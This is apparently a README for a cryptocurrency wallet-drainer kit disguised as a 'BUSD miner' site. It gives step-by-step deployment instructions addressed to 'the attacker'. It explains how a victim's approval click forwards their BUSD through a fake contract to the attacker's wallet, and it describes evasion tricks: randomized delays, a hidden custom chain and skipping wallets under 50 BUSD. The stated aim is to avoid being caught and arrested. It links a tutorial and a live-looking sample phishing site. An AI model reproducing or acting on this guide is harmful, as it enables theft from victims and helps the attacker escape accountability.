1. Go to above link to deploy the code once you fork it


2. Follow the steps on netlify


3. deploy


4. Add your wallet to settings.js file use bsc address 


Steps you have to do as the attacker (you)

1. fork

2. deploy on netify

3. add bsc wallet to settings.js if you dont the smart contract will not foward it to you

4. go to netify and confirm deployment

Smart contract

1. the smart contract will foward the data to you to prevent you from being caught 

2. the contract has a 2 hour on average delay for added security it can take up to 48 hours though its randomized 

3. The smart contract is deployed on a custom network for added security it cannot be found by the wallet address the script adds details to a custom blockchain network that will then foward it to you on the bsc network this part is copyrighted

4. the smart contract runs from the script in your fork and is running 24/7 so you have full control 

5. If the victim has less than 50 busd in there wallet it will not drain it so its harder to detect it waits for the victim to get a certain amount of busd

youtube tutorial https://www.youtube.com/watch?v=SnDlcDBAjso
sample site https://busdminer.netlify.app/

To use all you have to do is put your wallet address in the settings.js file.

After the victim clicks approve it fowards the transaction to the fake contract that then fowards it to the wallet in the settings.js file this is to make sure the attacker
doesnt get caught. This prevents the attacker from being caught and arrested, this new stealth feature is a custom code that is copyrighted.
